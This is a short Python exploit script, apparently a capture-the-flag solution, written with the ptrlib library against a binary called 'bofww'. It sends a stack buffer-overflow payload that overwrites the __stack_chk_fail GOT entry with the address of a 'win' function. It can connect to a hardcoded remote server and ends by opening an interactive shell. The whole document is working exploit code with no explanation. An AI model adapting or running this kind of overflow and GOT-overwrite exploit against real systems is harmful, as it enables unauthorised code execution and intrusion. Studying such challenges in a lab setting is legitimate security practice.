#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./bofww")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("34.170.146.252", 52457)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    __stack_chk_fail_got = 0x404050
    win = 0x4012F6

    pl = ptr.p64(win)
    pl = pl.ljust(0x130, b"A")
    pl += ptr.p64(__stack_chk_fail_got)

    io.sendlineafter("What is your first name? ", pl)
    io.sendlineafter("How old are you? ", b"1")

    io.sh()


if __name__ == "__main__":
    main()
